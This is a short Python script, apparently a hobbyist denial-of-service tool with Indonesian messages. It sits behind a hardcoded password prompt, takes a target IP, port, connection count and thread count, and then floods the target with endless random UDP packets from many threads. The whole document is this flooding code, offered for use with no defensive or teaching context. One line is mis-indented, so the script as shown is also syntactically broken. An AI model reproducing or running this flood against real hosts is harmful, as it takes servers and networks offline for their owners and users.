import random
import socket
import threading
import os
import sys

os.system("clear")
print('''\033[94m
▒█▀▀█ ▀▀█ █▀▀█ █▀▀█ █░█ █░░█ ▀▀█ 
▒█░▄▄ ▄▀░ █▄▄█ █▄▄█ ▄▀▄ █▄▄█ ▄▀░ 
▒█▄▄█ ▀▀▀ ▀░░▀ ▀░░▀ ▀░▀ ▄▄▄█ ▀▀▀''')
print("\033[93m")
Password = input("PASSWORD: ")

if Password=="Gzaaxyz": 
    print(f"""
Password yang anda masukan Benar !!
    """) 
os.system("clear")
    print('''\033[94m
▒█▀▀█ ▀▀█ █▀▀█ █▀▀█ █░█ █░░█ ▀▀█ 
▒█░▄▄ ▄▀░ █▄▄█ █▄▄█ ▄▀▄ █▄▄█ ▄▀░ 
▒█▄▄█ ▀▀▀ ▀░░▀ ▀░░▀ ▀░▀ ▄▄▄█ ▀▀▀''')

    ip = str(input("ip:"))
    port = int(input("Port:"))
    times = int(input("Connections:"))
    threads = int(input("Threading:"))
    def run():
        data = random._urandom(860)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip),int(port))
                for x in range(times):
                    s.sendto(data,addr)
                print("\033[92m!! 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 Nih Dek !!!")
            except:
                print("\033[91m!! 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 Attack !!!")

    for y in range(threads):
            th = threading.Thread(target = run)
            th.start()

else :
    print("Password anda salah Silahkan coba ulangi lagi nanti")